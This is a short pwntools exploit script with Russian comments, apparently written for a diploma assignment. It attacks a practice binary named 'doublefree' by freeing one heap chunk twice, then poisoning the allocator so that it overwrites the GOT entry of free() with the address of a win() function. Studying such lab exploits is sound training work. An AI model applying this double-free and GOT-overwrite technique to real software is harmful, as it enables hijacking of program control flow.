#!/usr/bin/python3
#   Автор   : Abdellah Oulahyane
#   Код цели: Дипломное задание

from pwn import *
elf  = context.binary = ELF('./doublefree')   #Создание объекта ELF 
def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([elf.path]+argv, gdbscript=gdbscript, *a, **kw)  # помогите подключить процесс с помощью gdb 
	else:
		return process([elf.path]+argv,  *a, **kw)						  # Порождает новый процесс и оборачивает его трубкой для связи.
gdbscript = '''
tbreak main									
continue
'''.format(**locals())
def malloc(size):
	io.sendlineafter(b"exit\n", f"1 {size}".encode())
	
def free(index):
	io.sendlineafter(b"exit\n", f"2 {index}".encode()) 

def  edit(index , data):	
	tmp = f"3 {index}".encode()
	io.sendlineafter(b"exit\n", tmp+data)

io = start()				# запустить
malloc(8)                   # запрос на выделение 8 байт
free(0)                     # освобождение индекса 0
free(0)                     # освобождение индекса 0
malloc(8)                   # запрос на выделение 8 байт
edit(1, pack(elf.got.free)) # Перезаписать элемент с индексом 1 по адресу free()
malloc(8)                   # запрос на выделение 8 байт
malloc(8)                   # запрос на выделение 8 байт
edit(3, pack(elf.sym.win))  # Перезаписать элемент с индексом 3 по адресу win()
io.interactive()            # интерактивный